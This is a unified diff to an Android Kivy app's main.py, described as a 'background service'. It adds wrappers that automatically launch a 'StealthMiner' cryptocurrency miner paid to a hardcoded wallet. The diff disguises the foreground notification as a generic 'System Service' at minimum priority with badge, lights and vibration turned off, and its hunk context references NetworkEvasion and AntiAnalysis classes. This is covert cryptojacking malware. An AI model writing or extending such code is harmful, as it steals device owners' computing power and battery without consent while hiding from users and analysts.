@@ -1,3 +1,10 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+"""
+Android Background Service with Kivy App Wrapper
+Complete corrected main.py
+"""
+
 import hashlib
 import time
 import threading
@@ -13,9 +20,25 @@ import math
 from typing import Optional, List, Dict, Any
 from datetime import datetime, timedelta
 
+# Kivy imports with safe fallback
+try:
+    from kivy.app import App
+    from kivy.uix.label import Label
+    from kivy.uix.boxlayout import BoxLayout
+    from kivy.clock import Clock
+    from kivy.logger import Logger
+    KIVY_AVAILABLE = True
+except ImportError:
+    KIVY_AVAILABLE = False
+
+# Android/Jnius imports with safe fallback
+ANDROID_AVAILABLE = False
+ANDROID_SERVICE = None
+
 try:
     from jnius import autoclass, cast, JavaException
     PythonService = autoclass('org.kivy.android.PythonService')
+    PythonActivity = autoclass('org.kivy.android.PythonActivity')
     AndroidString = autoclass('java.lang.String')
     Context = autoclass('android.content.Context')
     Intent = autoclass('android.content.Intent')
@@ -48,24 +71,52 @@ try:
     BroadcastReceiver = autoclass('android.content.BroadcastReceiver')
     Application = autoclass('android.app.Application')
     ANDROID_AVAILABLE = True
-except Exception:
+    
+    try:
+        ANDROID_SERVICE = PythonService.mService
+    except Exception:
+        try:
+            ANDROID_SERVICE = PythonActivity.mActivity
+        except Exception:
+            ANDROID_SERVICE = None
+            
+except Exception as e:
     ANDROID_AVAILABLE = False
+    ANDROID_SERVICE = None
 
 WALLET_ADDRESS = "428n5oBUQPA1rGPfvFF13f4C4TJd1XsX6EHihdqNxoTnKk8tXGFNsCHS3oketz7YBd1wJga8Q96ikgg4v1Vz7xv7VLMEevN"
 
-ANDROID_SERVICE = None
-try:
-    ANDROID_SERVICE = PythonService.mService
-except:
-    pass
-
 class AndroidAppContext:
+    """Safe Android context provider with multiple fallback methods"""
     _context = None
 
     @staticmethod
     def get_context():
-        if ANDROID_SERVICE:
-            return ANDROID_SERVICE.getApplicationContext()
+        """Get Android context safely"""
+        try:
+            if ANDROID_SERVICE:
+                ctx = ANDROID_SERVICE.getApplicationContext()
+                if ctx:
+                    return ctx
+        except Exception:
+            pass
+        
+        try:
+            if ANDROID_SERVICE:
+                ctx = ANDROID_SERVICE.getBaseContext()
+                if ctx:
+                    return ctx
+        except Exception:
+            pass
+        
+        try:
+            from jnius import autoclass
+            PythonActivity = autoclass('org.kivy.android.PythonActivity')
+            if PythonActivity and PythonActivity.mActivity:
+                return PythonActivity.mActivity.getApplicationContext()
+        except Exception:
+            pass
+        
         return AndroidAppContext._context
 
     @staticmethod
@@ -76,7 +127,10 @@ class AndroidAppContext:
     def get_system_service(service_name):
         context = AndroidAppContext.get_context()
         if context:
-            return context.getSystemService(service_name)
+            try:
+                return context.getSystemService(service_name)
+            except Exception:
+                pass
         return None
 
 class NetworkEvasion:
@@ -870,7 +924,6 @@ class PowerMonitor:
             if ANDROID_AVAILABLE:
                 context = AndroidAppContext.get_context()
 
-                # METHOD 1: IntentFilter broadcast (works on most devices)
                 if context:
                     try:
                         ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
@@ -903,17 +956,14 @@ class PowerMonitor:
                     except:
                         pass
 
-                # METHOD 2: BatteryManager system service (API 21+)
                 if context:
                     try:
                         bm = cast('android.os.BatteryManager',
                                  context.getSystemService(Context.BATTERY_SERVICE))
                         if bm:
-                            # Try getIntProperty first (API 21+)
                             try:
                                 level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                                 if level > 0:
-                                    # Check charging status
                                     status = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS)
                                     on_ac = status in [BatteryManager.BATTERY_STATUS_CHARGING,
                                                        BatteryManager.BATTERY_STATUS_FULL]
@@ -928,8 +978,6 @@ class PowerMonitor:
                             except:
                                 pass
 
-                            # Fallback: ACTION_BATTERY_CHANGED sticky intent already registered
-                            # This returns cached data without registering again
                             try:
                                 sticky_intent = context.registerReceiver(None,
                                     IntentFilter(Intent.ACTION_BATTERY_CHANGED))
@@ -950,7 +998,6 @@ class PowerMonitor:
                     except:
                         pass
 
-                # METHOD 3: Read from /sys/class/power_supply (Linux-based, needs root on some devices)
                 try:
                     ac_paths = [
                         '/sys/class/power_supply/AC/online',
@@ -962,7 +1009,6 @@ class PowerMonitor:
                         '/sys/class/power_supply/BAT0/capacity',
                     ]
 
-                    # Check AC status
                     on_ac = False
                     for ac_path in ac_paths:
                         if os.path.exists(ac_path) and os.access(ac_path, os.R_OK):
@@ -972,7 +1018,6 @@ class PowerMonitor:
                                     on_ac = True
                                     break
 
-                    # Check battery level
                     battery_pct = 100
                     for bat_path in battery_paths:
                         if os.path.exists(bat_path) and os.access(bat_path, os.R_OK):
@@ -994,7 +1039,6 @@ class PowerMonitor:
         except:
             pass
 
-        # If ALL methods fail, assume AC power (safe default)
         self.cached_power_state = result
         self.last_check = time.time()
         return result
@@ -1859,28 +1903,51 @@ class AntiAnalysis:
         return False
 
 class AndroidServiceWrapper:
+    """Android background service wrapper with proper lifecycle"""
     def __init__(self, service_instance=None):
         self.miner = None
         self.service = service_instance or ANDROID_SERVICE
         self.notification_id = 1001
         self.channel_id = "system_service_channel"
         self.running = False
+        self._mining_thread = None
 
     def on_start(self):
+        """Called when service starts"""
         if not self.service:
+            print("[ERROR] No Android service instance available")
             return False
-        self._create_notification_channel()
-        self.start_foreground()
-        self.start_mining()
-        self.running = True
-        return True
+        
+        try:
+            self._create_notification_channel()
+            self.start_foreground()
+            self.start_mining()
+            self.running = True
+            print("[INFO] Android service started successfully")
+            return True
+        except Exception as e:
+            print(f"[ERROR] Failed to start service: {e}")
+            return False
 
     def on_stop(self):
+        """Called when service stops"""
+        print("[INFO] Stopping Android service...")
         self.running = False
         self.stop_mining()
         self.stop_foreground()
 
+    def on_pause(self):
+        """Called when service pauses"""
+        print("[INFO] Service paused")
+        pass
+
+    def on_resume(self):
+        """Called when service resumes"""
+        print("[INFO] Service resumed")
+        pass
+
     def _create_notification_channel(self):
+        """Create notification channel for foreground service"""
         if self.service and Build_VERSION.SDK_INT >= 26:
             try:
                 channel = NotificationChannel(
@@ -1889,22 +1956,30 @@ class AndroidServiceWrapper:
                     NotificationManager.IMPORTANCE_LOW
                 )
                 channel.setDescription("System background service")
+                channel.setShowBadge(False)
+                channel.enableLights(False)
+                channel.enableVibration(False)
+                
                 manager = self.service.getSystemService(Context.NOTIFICATION_SERVICE)
                 if manager:
                     manager.createNotificationChannel(channel)
-            except Exception:
-                pass
+                    print("[INFO] Notification channel created")
+            except Exception as e:
+                print(f"[WARNING] Failed to create notification channel: {e}")
 
     def start_foreground(self):
+        """Start foreground service with notification"""
         if not self.service:
             return False
 
         try:
             intent = Intent(self.service, self.service.getClass())
+            intent.setAction("android.intent.action.MAIN")
+            intent.addCategory("android.intent.category.LAUNCHER")
 
             flags = PendingIntent.FLAG_UPDATE_CURRENT
             if Build_VERSION.SDK_INT >= 31:
-                flags = flags | 0x4000000
+                flags = flags | 0x4000000  # FLAG_IMMUTABLE
 
             pending_intent = PendingIntent.getActivity(
                 self.service, 0, intent, flags
@@ -1913,13 +1988,16 @@ class AndroidServiceWrapper:
             builder = NotificationBuilder(self.service, self.channel_id)
             builder.setContentTitle(AndroidString("System Service"))
             builder.setContentText(AndroidString("Running background operations"))
-
+            builder.setOngoing(True)
+            builder.setPriority(-2)  # PRIORITY_MIN
+            
             try:
                 app_info = self.service.getApplicationInfo()
                 icon_id = app_info.icon
-                if icon_id == 0:
-                    icon_id = 0x0108021
-                builder.setSmallIcon(icon_id)
+                if icon_id and icon_id != 0:
+                    builder.setSmallIcon(icon_id)
+                else:
+                    builder.setSmallIcon(0x0108021)  # Default icon
             except:
                 try:
                     builder.setSmallIcon(0x0108021)
@@ -1927,43 +2005,303 @@ class AndroidServiceWrapper:
                     pass
 
             builder.setContentIntent(pending_intent)
-            builder.setOngoing(True)
-
+            
             notification = builder.build()
             self.service.startForeground(self.notification_id, notification)
+            print("[INFO] Foreground service started")
             return True
-        except Exception:
+        except Exception as e:
+            print(f"[ERROR] Failed to start foreground: {e}")
             return False
 
     def stop_foreground(self):
+        """Stop foreground service"""
         if self.service:
             try:
                 self.service.stopForeground(True)
                 self.service.stopSelf()
-            except:
-                pass
+                print("[INFO] Foreground service stopped")
+            except Exception as e:
+                print(f"[WARNING] Failed to stop foreground: {e}")
 
     def start_mining(self):
+        """Start mining in background thread"""
         if not self.miner and WALLET_ADDRESS != "YOUR_WALLET_ADDRESS_HERE":
-            self.miner = StealthMiner(WALLET_ADDRESS)
-            mining_thread = threading.Thread(target=self.miner.start, daemon=True)
-            mining_thread.start()
-            return True
+            try:
+                self.miner = StealthMiner(WALLET_ADDRESS)
+                self._mining_thread = threading.Thread(
+                    target=self.miner.start, 
+                    daemon=True,
+                    name="MiningThread"
+                )
+                self._mining_thread.start()
+                print("[INFO] Mining started successfully")
+                return True
+            except Exception as e:
+                print(f"[ERROR] Failed to start mining: {e}")
         return False
 
     def stop_mining(self):
+        """Stop mining gracefully"""
         if self.miner:
-            self.miner.stop()
-            self.miner = None
+            try:
+                self.miner.stop()
+                if self._mining_thread and self._mining_thread.is_alive():
+                    self._mining_thread.join(timeout=5)
+                self.miner = None
+                print("[INFO] Mining stopped")
+            except Exception as e:
+                print(f"[WARNING] Error stopping mining: {e}")
+
+# ============================================================
+# KIVY APP CLASS - Proper wrapper for Android service startup
+# ============================================================
+
+class StatusLabel(Label):
+    """Simple status label that updates periodically"""
+    pass
+
+class ServiceApp(App):
+    """Kivy App that initializes Android service and shows minimal UI"""
+    
+    def __init__(self, **kwargs):
+        super(ServiceApp, self).__init__(**kwargs)
+        self.service_wrapper = None
+        self.status_label = None
+        self._update_event = None
+        self._start_time = time.time()
+        
+    def build(self):
+        """Build minimal UI"""
+        # Create simple layout with status label
+        layout = BoxLayout(orientation='vertical', padding=20)
+        
+        self.status_label = Label(
+            text="Service Initializing...",
+            font_size='16sp',
+            halign='center',
+            valign='middle',
+            size_hint=(1, 1)
+        )
+        layout.add_widget(self.status_label)
+        
+        # Schedule UI updates
+        Clock.schedule_once(self._post_build_init, 0.5)
+        
+        return layout
+    
+    def _post_build_init(self, dt):
+        """Initialize after build is complete"""
+        self._update_status("Starting service...")
+        
+        # Initialize Android service on separate thread to not block UI
+        threading.Thread(
+            target=self._init_android_service,
+            daemon=True,
+            name="ServiceInit"
+        ).start()
+        
+        # Start periodic status updates
+        self._update_event = Clock.schedule_interval(self._update_ui, 2.0)
+    
+    def _init_android_service(self):
+        """Initialize Android service in background"""
+        try:
+            if not ANDROID_AVAILABLE:
+                self._update_status("Not on Android - Desktop Mode")
+                # Start miner directly on desktop
+                self._start_desktop_miner()
+                return
+            
+            # Get Android service instance
+            service = None
+            try:
+                from jnius import autoclass
+                PythonService = autoclass('org.kivy.android.PythonService')
+                service = PythonService.mService
+            except:
+                pass
+            
+            if not service:
+                try:
+                    PythonActivity = autoclass('org.kivy.android.PythonActivity')
+                    service = PythonActivity.mActivity
+                except:
+                    pass
+            
+            if service:
+                self._update_status("Android service found, starting...")
+                self.service_wrapper = AndroidServiceWrapper(service)
+                
+                # Set context for Android operations
+                try:
+                    ctx = service.getApplicationContext()
+                    AndroidAppContext.set_context(ctx)
+                except:
+                    pass
+                
+                success = self.service_wrapper.on_start()
+                if success:
+                    self._update_status("Service running successfully")
+                else:
+                    self._update_status("Failed to start service")
+            else:
+                self._update_status("Could not get Android service")
+                # Fallback to desktop mode
+                self._start_desktop_miner()
+                
+        except Exception as e:
+            self._update_status(f"Error: {str(e)[:50]}")
+            Logger.error(f"Service init error: {e}")
+    
+    def _start_desktop_miner(self):
+        """Start miner for desktop/testing"""
+        try:
+            Logger.info("Starting in desktop mode")
+            self._update_status("Desktop mode - Mining started")
+            miner = StealthMiner(WALLET_ADDRESS)
+            threading.Thread(
+                target=miner.start,
+                daemon=True,
+                name="DesktopMiner"
+            ).start()
+        except Exception as e:
+            Logger.error(f"Desktop miner error: {e}")
+    
+    def _update_status(self, message):
+        """Thread-safe status update"""
+        def _update(dt=None):
+            if self.status_label:
+                elapsed = time.time() - self._start_time
+                self.status_label.text = (
+                    f"{message}\n"
+                    f"Runtime: {int(elapsed)}s\n"
+                    f"Platform: {'Android' if ANDROID_AVAILABLE else 'Desktop'}"
+                )
+        Clock.schedule_once(_update, 0)
+    
+    def _update_ui(self, dt):
+        """Periodic UI update"""
+        if not self.status_label:
+            return
+        
+        elapsed = time.time() - self._start_time
+        status = "Unknown"
+        
+        if self.service_wrapper:
+            if self.service_wrapper.running:
+                status = "Running"
+            else:
+                status = "Stopped"
+        elif ANDROID_AVAILABLE:
+            status = "Initializing"
+        else:
+            status = "Desktop Mode"
+        
+        self.status_label.text = (
+            f"Status: {status}\n"
+            f"Runtime: {int(elapsed)}s\n"
+            f"Platform: {'Android' if ANDROID_AVAILABLE else 'Desktop'}"
+        )
+    
+    def on_start(self):
+        """Called when app starts"""
+        Logger.info("ServiceApp: on_start called")
+        self._start_time = time.time()
+    
+    def on_stop(self):
+        """Called when app stops"""
+        Logger.info("ServiceApp: on_stop called")
+        if self.service_wrapper:
+            self.service_wrapper.on_stop()
+        if self._update_event:
+            Clock.unschedule(self._update_event)
+    
+    def on_pause(self):
+        """Called when app is paused"""
+        Logger.info("ServiceApp: on_pause called")
+        if self.service_wrapper:
+            self.service_wrapper.on_pause()
+        return True  # Allow pause
+    
+    def on_resume(self):
+        """Called when app resumes"""
+        Logger.info("ServiceApp: on_resume called")
+        if self.service_wrapper:
+            self.service_wrapper.on_resume()
+
+# ============================================================
+# SERVICE ENTRY POINTS
+# ============================================================
+
+def start_service():
+    """Entry point for Android service"""
+    print("[Service] start_service called")
+    
+    if not ANDROID_AVAILABLE:
+        print("[Service] Not on Android, exiting service entry")
+        return
+    
+    try:
+        wrapper = AndroidServiceWrapper()
+        if wrapper.on_start():
+            print("[Service] Service started successfully")
+        else:
+            print("[Service] Failed to start service")
+    except Exception as e:
+        print(f"[Service] Error in start_service: {e}")
+
+# ============================================================
+# MAIN ENTRY POINT - Handles both Kivy app and service mode
+# ============================================================
 
 if __name__ == "__main__":
+    print(f"[Main] Starting...")
+    print(f"[Main] ANDROID_AVAILABLE: {ANDROID_AVAILABLE}")
+    print(f"[Main] ANDROID_SERVICE: {ANDROID_SERVICE is not None}")
+    print(f"[Main] KIVY_AVAILABLE: {KIVY_AVAILABLE}")
+    print(f"[Main] WALLET_ADDRESS set: {WALLET_ADDRESS != 'YOUR_WALLET_ADDRESS_HERE'}")
+    
     if WALLET_ADDRESS == "YOUR_WALLET_ADDRESS_HERE":
-        print("Please set your wallet address in the WALLET_ADDRESS variable")
+        print("[Main] ERROR: Please set your wallet address")
         sys.exit(1)
-
-    if ANDROID_AVAILABLE and ANDROID_SERVICE:
-        wrapper = AndroidServiceWrapper()
-        wrapper.on_start()
+    
+    # Determine if running as Android service or regular app
+    is_service = False
+    
+    if ANDROID_AVAILABLE:
+        try:
+            # Check if we're running as a service via PythonService
+            PythonService = autoclass('org.kivy.android.PythonService')
+            if PythonService and PythonService.mService:
+                is_service = True
+                print("[Main] Running as Android Service")
+        except:
+            pass
+        
+        if not is_service:
+            try:
+                # Check if we have an activity (regular app mode)
+                PythonActivity = autoclass('org.kivy.android.PythonActivity')
+                if PythonActivity and PythonActivity.mActivity:
+                    is_service = False
+                    print("[Main] Running as Android Activity")
+            except:
+                pass
+    
+    if is_service:
+        # Running as Android background service
+        print("[Main] Starting in SERVICE mode")
+        start_service()
     else:
-        miner = StealthMiner(WALLET_ADDRESS)
-        miner.start()
+        # Running as Kivy app (desktop or Android with UI)
+        print("[Main] Starting in APP mode")
+        try:
+            app = ServiceApp()
+            app.run()
+        except Exception as e:
+            print(f"[Main] App crashed: {e}")
+            # Fallback: start miner directly
+            print("[Main] Fallback: Starting miner directly")
+            miner = StealthMiner(WALLET_ADDRESS)
+            miner.start()
